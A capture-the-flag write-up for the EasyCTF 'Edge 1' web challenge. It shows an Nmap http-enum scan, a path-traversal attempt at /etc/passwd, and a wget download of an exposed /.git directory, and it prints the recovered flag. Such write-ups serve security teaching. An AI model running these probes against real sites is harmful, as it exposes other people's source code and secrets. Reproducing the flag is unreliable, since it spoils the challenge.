# Edge 1 - 100 points

We found Edge inc's website! Take a look at it [here](http://edge1.web.easyctf.com/).

### Solutions

The linked page, `http://edge1.web.easyctf.com/`, didn't expose a lot of obvious attack surface.
It seemed to be mostly static HTML; what CSS and JavaScript there was, appeared to be standard Bootstrap and jQuery.
We found directory listings at `http://edge1.web.easyctf.com/css/` and `http://edge1.web.easyctf.com/js/`, but they weren't helpful.
We inspected the HTTP headers and found nothing unusual.

We idly tried various URL paths, like `/index.html.bak`, `/index.html.swp`, `/%`, `/%20`, and `/../../../../../../../../etc/passwd`,
but none of them led anywhere.
Finally we tried the Nmap <a href="https://nmap.org/nsedoc/scripts/http-enum.html">http-enum</a> script,
which tests for the existence of [thousands of common URL paths](https://svn.nmap.org/nmap/nselib/data/http-fingerprints.lua?p=36661).
It hit the jackpot by finding a `/.git` directory:

```
$ nmap --script 'http-enum' -v edge1.web.easyctf.com -p80 -oN http-enum.nmap

...
Completed NSE at 19:41, 169.53s elapsed
Nmap scan report for edge1.web.easyctf.com (104.31.94.100)
Host is up (0.0038s latency).
Other addresses for edge1.web.easyctf.com (not scanned): 104.31.95.100
PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /.git/HEAD: Git folder
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
|_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
```

The `/.git` directory was probably where the flag was.
We tried directly cloning the repo, but that didn't work,
probably because the repo hadn't run [`git update-server-info`](https://www.kernel.org/pub/software/scm/git/docs/githooks.html#post-update),
which is needed for cloning a repo over HTTP:

```
$ git clone -v http://edge1.web.easyctf.com/.git
Cloning into 'edge1.web.easyctf.com'...
fatal: repository 'http://edge1.web.easyctf.com/.git/' not found
```

Instead, we took the brute-force approach of recursively downloading the entire `/.git` directory:

```
$ wget -r -np http://edge1.web.easyctf.com/.git
```

From there, all we had to do was enter the directory and inspect the revision history
with [`git log`](https://www.git-scm.com/docs/git-log), then retrieve the flag with
[`git show`](https://www.git-scm.com/docs/git-show):

```
$ cd edge1.web.easyctf.com/
$ git log
commit ee9061b25d8a35bae8380339f187b44dc26f4999
Author: Michael <michael@easyctf.com>
Date:   Mon Mar 13 07:11:47 2017 +0000

    Whoops! Remove flag.

commit afdf86202dc8a3c3d671f2106d5cffa593f2b320
Author: Michael <michael@easyctf.com>
Date:   Mon Mar 13 07:11:45 2017 +0000

    Initial.

commit 15ca375e54f056a576905b41a417b413c57df6eb
Author: Fernando <fermayo@gmail.com>
Date:   Sat Dec 14 12:50:09 2013 -0300

    initial version

commit 8ac4f76df2ce8db696d75f5f146f4047a315af22
Author: Fernando Mayo <fermayo@gmail.com>
Date:   Sat Dec 14 07:36:18 2013 -0800

    Initial commit
```

```
$ git show
commit ee9061b25d8a35bae8380339f187b44dc26f4999
Author: Michael <michael@easyctf.com>
Date:   Mon Mar 13 07:11:47 2017 +0000

    Whoops! Remove flag.

diff --git a/flag.txt b/flag.txt
deleted file mode 100644
index a1009d9..0000000
--- a/flag.txt
+++ /dev/null
@@ -1 +0,0 @@
-easyctf{w3_ev3n_u53_git}
```

Flag:
```
easyctf{w3_ev3n_u53_git}
```

### External Writeups
